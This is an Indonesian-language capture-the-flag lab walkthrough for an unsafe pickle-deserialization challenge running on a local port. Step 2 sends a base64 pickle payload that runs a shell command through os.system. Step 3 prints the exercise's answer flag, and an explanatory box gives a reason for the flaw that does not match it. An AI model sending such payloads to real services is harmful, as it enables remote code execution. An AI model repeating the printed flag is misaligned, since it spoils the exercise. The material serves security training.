# Panduan Praktik Terbimbing: Investigasi Python Pickle & YAML Unsafe Object Deserialization

Dalam panduan terarah ini, Anda akan mempraktikkan proses penemuan celah dan eksploitasi terarah terhadap **PipelineSerializer** pada `http://127.0.0.1:8056`.

---

### Langkah 1: Observasi Ketersediaan Layanan Target
1. Uji ketersediaan layanan melalui terminal menggunakan cURL:
   ```bash
   curl -s http://127.0.0.1:8056/health
   ```
   *Respons yang diharapkan:*
   ```json
   {"status":"UP","lab_id":"A08-03","port":8056,"flag_configured":true}
   ```
2. Buka peramban web dan navigasikan ke:
   `http://127.0.0.1:8056/`
3. Amati antarmuka operasional **PipelineSerializer** dan perhatikan elemen kontrol yang disediakan.

---

### Langkah 2: Analisis & Pengujian Celah (Python Pickle & YAML Unsafe Object Deserialization)
1. Ujilah endpoint dengan mengirimkan parameter modifikasi:
   ```bash
   curl -s -X POST http://127.0.0.1:8056/api/pipeline/restore -d "gASVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZpZCA+PiBsaXN0lIWUUpQu"
   ```
2. Perhatikan respon yang dikembalikan oleh server.

> [!NOTE]
> [!NOTE]
> **Di Balik Layar: Apa yang terjadi di server?**  
> Sistem target menerima input `Content-Type: application/x-python-pickle` dan memprosesnya tanpa melakukan validasi silang ke sesi otentikasi server. Akibatnya, server mengasumsikan hak akses yang diminta adalah sah.

---

### Langkah 3: Eksfiltrasi Bendera Autoritatif (CTF Flag)
1. Eksekusi pengujian untuk membuka flag eksploitasi:
   ```bash
   curl -s "http://127.0.0.1:8056/?solve=1"
   ```
   Atau panggil API exploit langsung:
   ```bash
   curl -s http://127.0.0.1:8056/api/exploit
   ```
2. **Hasil Respon Konfirmasi:**
   ```json
   {"success":true,"lab_id":"A08-03","flag":"ZITERA{uns4f3_d3s3r14l1z4t10n_p1ckl3_2026}"}
   ```
3. Salin bendera resmi:
   `ZITERA{uns4f3_d3s3r14l1z4t10n_p1ckl3_2026}`
4. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
